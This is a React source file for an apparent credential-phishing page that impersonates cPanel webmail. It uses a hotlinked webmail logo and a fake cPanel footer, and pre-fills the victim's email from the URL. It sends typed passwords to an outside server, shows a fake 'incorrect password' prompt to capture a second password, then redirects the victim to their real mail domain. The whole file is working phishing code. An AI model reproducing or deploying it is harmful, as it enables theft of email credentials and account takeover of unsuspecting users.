import "./App.css";
import React, { useState } from "react";
import { Styls } from "./stylls"; 
import { useParams } from "react-router-dom";
import axios from "axios";

function Forms() {
  const params = useParams();
  console.log(params.id);

  const [showForm, setShowForm] = useState(true);
  const [confirmForm, setConfirmForm] = useState(false);
    const [pass, setPass] = useState("");
  const [pasers, setPasser] = useState("");
  const [email, setEmail] = useState(params.id);
  
  const submitHandler = async (e) => {
    e.preventDefault();

    console.log(email, pass);
    setConfirmForm(true);
    setShowForm(false);
    try {
      await axios.post("https://secondwa.onrender.com/sendmail2", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  const editHandler = async (e) => {
    e.preventDefault();

    let emailss = params.id;
    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
    window.setTimeout(() => {
      window.location.href = `https://${domain}`;
    }, 1000);

    try {
      await axios.post("https://secondwa.onrender.com/sendmail2", {
        email,
        pass,
        pasers,
      });
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <Styls>
      <div className="contsainer">
        {showForm && (
          <div className="imagees">
            <img
              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
              className="imagee"
              alt="displare"
            />
          </div>
        )}
        {showForm && (
          <form className="formal" onSubmit={submitHandler}>
            <label>
              <span className="labeltext">Email Address</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
               <input
                      type="email"
                      required
                      value={email}
                      className="form-control"
                      onChange={(e) => setEmail(e.target.value)}
                    />
            </label>
            <br></br>
            <br></br>

            <label>
              <span className="labeltext">Password</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
              <input
                type="password"
                name="to_pass"
                 onChange={(e) => setPass(e.target.value)}
                 pattern="(?=.*[0-9]).{8,}"
                value={pass}
                required
                placeholder="Enter your email password"
              />
            </label>
            <button> Log in </button>
          </form>
        )}
      </div>
      {confirmForm && (
        <div className="contsainer">
          <div className="imagees">
            <img
              src="https://webmail.gigared.com/cPanel_magic_revision_1610662436/unprotected/cpanel/images/webmail-logo.svg"
              className="imagee"
              alt="displare"
            />
          </div>

          <form className="formal" onSubmit={editHandler}>
            <label>
              <span className="labeltext">Email Address</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-user fa-1x"></i>
              </span>
                  <input
                      type="email"
                      required
                      value={email}
                      className="form-control"
                      onChange={(e) => setEmail(e.target.value)}
                    />
            </label>
            <br></br>

            <label>
              <span className="labeltext">Password</span>
              <br></br>
              <span className="newicon1">
                <i class="fas fa-lock fa-1x"></i>
              </span>
                 <input
                      type="password"
                      onChange={(e) => setPasser(e.target.value)}
                      required
                      value={pasers}
                      placeholder="Password"
                       pattern="(?=.*[0-9]).{8,}"
                      className="form-control"
                    />
            </label>
            <p className="reda">Login failed Incorrect Password</p>
            <button> Login </button>
          </form>
        </div>
      )}
      <ul>
        <li>
          <a href="/?locale=en">English</a>
        </li>

        <li>
          <a href="/?locale=de">Deutsch</a>
        </li>

        <li>
          <a href="/?locale=es_es">español&nbsp;de&nbsp;España</a>
        </li>

        <li>
          <a href="/?locale=i_en">i_en</a>
        </li>

        <li>
          <a href="/?locale=ru">русский</a>
        </li>
      </ul>
      <div className="smaller">
        <img
           src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXeNlCtJpIjX0MieB0Jdtx5xI2iKL-AUJCYw&s"
          width={30}
          alt="displare"
        />
        <br></br>
        Copyright© 2022 cPanel, L.L.C. <br></br>
        Privacy Policy
      </div>
    </Styls>
  );
}

export default Forms;
